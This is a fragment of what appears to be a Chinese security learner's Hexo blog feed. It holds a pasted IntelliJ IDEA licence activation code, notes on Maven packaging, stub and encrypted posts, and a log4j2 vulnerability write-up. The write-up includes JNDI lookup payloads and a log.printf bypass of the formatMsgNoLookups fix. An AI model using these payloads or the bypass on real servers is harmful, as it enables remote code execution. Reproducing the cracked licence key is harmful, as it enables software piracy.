ImNvZGUiOiJQUEMiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTAxLTI0IiwicGFpZFVwVG8iOiIyMDIzLTAxLTI0IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBSQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDEtMjQiLCJwYWlkVXBUbyI6IjIwMjMtMDEtMjQiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFNXIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU0kiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTAxLTI0IiwicGFpZFVwVG8iOiIyMDIzLTAxLTI0IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfV0sIm1ldGFkYXRhIjoiMDEyMDIyMDEyMVBTQU4wMDAwMDUiLCJoYXNoIjoiVFJJQUw6LTYyNTA2MDI4NyIsImdyYWNlUGVyaW9kRGF5cyI6NywiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-WlwI3NBiapY7em4MmP7qdZcTK2wvAt5f7FNwaH65H6SBvWnFGpe8M2VrSWCEBIGFQpv+VFJLghJKLjaRUcVOY6ttC6G4uKTpuPzELgcckez+/9DPrYj+alvLYFpS6UWy4uqzsjC/sHgcbNiCQjZQMVhj8Wflv9ts8SfWUqTwtciG8eBrzbyipXOVrRn5Wpk3l6ifL71HZsMy3bDLU8Lkt3UQBNVFZhXWBcNyY/WB9CQGX+6aXtbFA9p/hjbTZL050UoeM30rz0UkzPmfiIupbb3KNPKPArQkU8gw6pF7AcRSLuU3HNqq8RDbrXDYSXY9vtoD3Oi18ijlagVANrhjpQ==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBAB2J1ysRudbkqmkUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</code></pre></li><li><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/7.png" alt="image-7"></p></li><li><p>点击Active进行激活，<strong>prefect！！</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Idea </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Idea安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-maven打包学习</title>
      <link href="/2022/05/10/java-maven%E6%89%93%E5%8C%85%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/05/10/java-maven%E6%89%93%E5%8C%85%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="java-maven打包学习"><a href="#java-maven打包学习" class="headerlink" title="java-maven打包学习"></a>java-maven打包学习</h1><blockquote><p>之前提供spring写了一个shiro扫描key的工具，可惜简单的打包好像不行，因为有依赖包等等，因为我是提供spring框架提供的web服务去扫描的。今天就来填坑。。。。</p></blockquote><p>之前的打包一运行就报错。。非常难受。然后百度了一下原来是因为没有配置META-INF文件，所以在启动jar的时候找不到主类。而META-INF文件里面就配置了jar启动的主类和其他信息(Class-Path)。所以可以理解为启动jar的时候先去META-INF文件里面读配置然后执行java代码。你没有配置当然找不到主类咯。</p><p>然后就是来学习maven打包方式。</p><h3 id="maven命令"><a href="#maven命令" class="headerlink" title="maven命令"></a>maven命令</h3><p>1、mvn compile 编译,将Java 源程序编译成 class 字节码文件。</p><p>2、mvn test 测试，并生成测试报告</p><p>3、mvn clean 将以前编译得到的旧的 class 字节码文件删除</p><p>4、mvn pakage 打包,动态 web工程打 war包，Java工程打 jar 包。</p><p>5、mvn install 将项目生成 jar 包放在仓库中，以便别的模块调用</p><p>6、mvn clean install -Dmaven.test.skip=true  抛弃测试用例打包</p><h3 id="配置一"><a href="#配置一" class="headerlink" title="配置一"></a>配置一</h3><p>使用maven-jar-plugin和maven-dependency-plugin插件打包</p><p>通过<strong>mvn package</strong>指令打包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">classpathPrefix</span>&gt;</span>lib/<span class="tag">&lt;/<span class="name">classpathPrefix</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.xxg.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>maven-jar-plugin用于生成META-INF/MANIFEST.MF文件的部分内容，</p><p><mainClass>com.xxg.Main</mainClass>指定MANIFEST.MF中的Main-Class，</p><p><addClasspath>true</addClasspath>会在MANIFEST.MF加上Class-Path项并配置依赖包，</p><p><classpathPrefix>lib/</classpathPrefix>指定依赖包所在目录。</p><h3 id="配置二"><a href="#配置二" class="headerlink" title="配置二"></a>配置二</h3><p>使用maven-assembly-plugin插件打包</p><p>通过<strong>mvn package assembly:single</strong>指令打包 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.xxg.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="配置三"><a href="#配置三" class="headerlink" title="配置三"></a>配置三</h3><p>使用maven-shade-plugin插件打包</p><p>通过<strong>mvn package</strong>指令打包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">                        <span class="tag">&lt;<span class="name">transformers</span>&gt;</span>  </span><br><span class="line">                            <span class="tag">&lt;<span class="name">transformer</span> <span class="attr">implementation</span>=<span class="string">&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;</span>&gt;</span>  </span><br><span class="line">                                <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.xxg.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span>  </span><br><span class="line">                            <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span>  </span><br><span class="line">                        <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>这里自己喜欢第二个方法，如果记不住可以设置代码块。。</p><p><img src="/2022/05/10/java-maven%E6%89%93%E5%8C%85%E5%AD%A6%E4%B9%A0/image-20210818111820181.png" alt="image-20210818111820181"></p><blockquote><p>参考:</p><p><a href="https://blog.csdn.net/weixin_42248302/article/details/100886727">https://blog.csdn.net/weixin_42248302/article/details/100886727</a></p><p><a href="https://blog.csdn.net/sdrfengmi/article/details/87191944">https://blog.csdn.net/sdrfengmi/article/details/87191944</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java文件系统</title>
      <link href="/2022/03/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/03/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="47eba296a2319413459a3b32a1044f1842bf0ef054baa979c8bb19781c503cae"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> test image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机安装</title>
      <link href="/2022/02/24/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/"/>
      <url>/2022/02/24/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟机安装配置（VMware）"><a href="#虚拟机安装配置（VMware）" class="headerlink" title="虚拟机安装配置（VMware）"></a>虚拟机安装配置（VMware）</h1><blockquote><p><strong>MSDN是个好东西：</strong><a href="https://msdn.itellyou.cn/，Windows系列镜像包都在这里下。">https://msdn.itellyou.cn/，Windows系列镜像包都在这里下。</a></p></blockquote><h2 id="Wi11的安装配置"><a href="#Wi11的安装配置" class="headerlink" title="Wi11的安装配置"></a>Wi11的安装配置</h2><h2 id="Win10的安装配置"><a href="#Win10的安装配置" class="headerlink" title="Win10的安装配置"></a>Win10的安装配置</h2><h2 id="Win7的安装配置"><a href="#Win7的安装配置" class="headerlink" title="Win7的安装配置"></a>Win7的安装配置</h2><h2 id="XP的安装配置"><a href="#XP的安装配置" class="headerlink" title="XP的安装配置"></a>XP的安装配置</h2><h2 id="Mac的安装配置"><a href="#Mac的安装配置" class="headerlink" title="Mac的安装配置"></a>Mac的安装配置</h2><h2 id="Ubuntu的安装配置"><a href="#Ubuntu的安装配置" class="headerlink" title="Ubuntu的安装配置"></a>Ubuntu的安装配置</h2><h3 id="前期："><a href="#前期：" class="headerlink" title="前期："></a>前期：</h3><ul><li>下载官网镜像ISO：<a href="https://ubuntu.com/download/desktop">https://ubuntu.com/download/desktop</a></li></ul><h2 id="Kali-Linux的安装配置"><a href="#Kali-Linux的安装配置" class="headerlink" title="Kali Linux的安装配置"></a>Kali Linux的安装配置</h2><h3 id="前期：-1"><a href="#前期：-1" class="headerlink" title="前期："></a>前期：</h3><ul><li>下载官网镜像ISO：<a href="https://www.kali.org/get-kali/#kali-installer-images">https://www.kali.org/get-kali/#kali-installer-images</a></li></ul><h2 id="鹦鹉系统的安装配置"><a href="#鹦鹉系统的安装配置" class="headerlink" title="鹦鹉系统的安装配置"></a>鹦鹉系统的安装配置</h2><h2 id="Win集成化渗透工具平台的安装配置"><a href="#Win集成化渗透工具平台的安装配置" class="headerlink" title="Win集成化渗透工具平台的安装配置"></a>Win集成化渗透工具平台的安装配置</h2>]]></content>
      
      
      <categories>
          
          <category> 虚拟机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku Misc题解</title>
      <link href="/2022/01/21/Bugku-Misc%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/01/21/Bugku-Misc%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b2c125734df563f20b3b250a2b26061ac61cdf240411d61cf1fe105b4e7baa00">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f78380d04f1940ddb6d0b9487c2ecfb925885fe12d6e51b1c9d76a89e97c30f4be414966f2537af82a73c32cdccea3cc217e138f07e383b5d894a47fc3e41505c5d3199a0383148469310eab83d8d311a793e11871453f062214b7ec7459c8e693fb6e48cc2751cf9c1c8423ebec9d58bc7afe2e6927f304422296270ab9668161</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码的哦！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闲聊log4j2</title>
      <link href="/2022/01/19/%E9%97%B2%E8%B0%88log4j2/"/>
      <url>/2022/01/19/%E9%97%B2%E8%B0%88log4j2/</url>
      
        <content type="html"><![CDATA[<h1 id="闲谈log4j2"><a href="#闲谈log4j2" class="headerlink" title="闲谈log4j2"></a>闲谈log4j2</h1><h2 id="log4j2爆炸漏洞"><a href="#log4j2爆炸漏洞" class="headerlink" title="log4j2爆炸漏洞"></a>log4j2爆炸漏洞</h2><p>简单的说一下最近这个log4j2漏洞吧，这个漏洞自己也跟了有一段时间了。第一次在学长那听到了这个漏洞，当时只是跟但了jndi注入点并没有发现漏洞的入口，也就是${jndi:ldap://127.0.0.1/exp}.一方面是没有想到这个功能，但是之后感觉官方文档里面说了<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">文档</a>，可能是自己语文水平不太好。(有点吃亏。。。</p><h2 id="挖掘新问题"><a href="#挖掘新问题" class="headerlink" title="挖掘新问题"></a>挖掘新问题</h2><p>然后就是复现漏洞。挖新的问题。当时第一时间感觉这个东西肯定有问题，第一时间就想到了dos。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644571-d87566e9-ac55-44f7-aaf3-0a64beb97b01.png" alt="image-20211218215051277"></p><p>当时因为环境没有配置起就去睡觉了，当时已经是晚上的3点了。</p><p>说一下我当时发现的dos问题大致是因为数组长度我们可以控制造成溢出。第二天中午我大哥就提交了dos漏洞。之后就没有管了。</p><h2 id="绕过rc1"><a href="#绕过rc1" class="headerlink" title="绕过rc1"></a>绕过rc1</h2><p>在然后说一下绕过rc1吧这个东西虽然简单但是我调试了一下午，大概是因为对异常没有处理，也就是在catch中没有return，导致程序会继续执行。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644576-d80164ab-1879-4e01-a50e-626f1c99bf5e.png" alt="Q`X GHE7UL3 IBYUAB0EFW"></p><p>所以绕过思路就直接让new url(name) 抛出异常就欧克。</p><p>tips:和bypass7u21差不多。。。</p><h2 id="修复问题"><a href="#修复问题" class="headerlink" title="修复问题"></a>修复问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">今天看陈师傅写的文章，也就是修复log4j的坑。</span><br><span class="line">在漏洞报出来的时候修复的方法是：</span><br><span class="line"></span><br><span class="line">1.设置配置文件参数 log4j2.formatMsgNoLookups=true,</span><br><span class="line">2.vm启动环境参数 -Dlog4j2.formatMsgNolookups=true,</span><br><span class="line">3,设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true</span><br><span class="line">而这样的修复是打破这个判断</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146644579-6ed47eaf-8666-42ed-be31-7a01d83d860c.png" alt="image-20211215142114290"></p><p>认真看该代码其实在下面还有一个入口。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644583-ac2f76eb-028d-4afb-8f72-e5848746b49c.png" alt="image-20211215142251448"></p><p>可以看到判断条件是 <strong>msg instanceof StringBuilderFormattable</strong></p><p>所以可以走第二个入口就绕过了log4j2.formatMsgNoLookups=true的判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.printf(Level.ERROR,<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:2333&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd">https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd</a></p><p><a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p></blockquote><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>信息泄露这个问题我在漏洞刚刚出来的那天晚上就想到了，只是对比rce，信息泄露就微不足道。因为log4j2支持很多协议 sys等等可以看到env等等这些的信息，然后通过dns带出来。</p><p>不过值得说一下其中有一个思路通过ResourceBundleLookup类去获得读取项目中后缀为properties的配置文件，其中就可能有username/password。当时我是看到了只是不知道这个方法是干啥子的也没有去百度。。。哭死了。</p><p><a 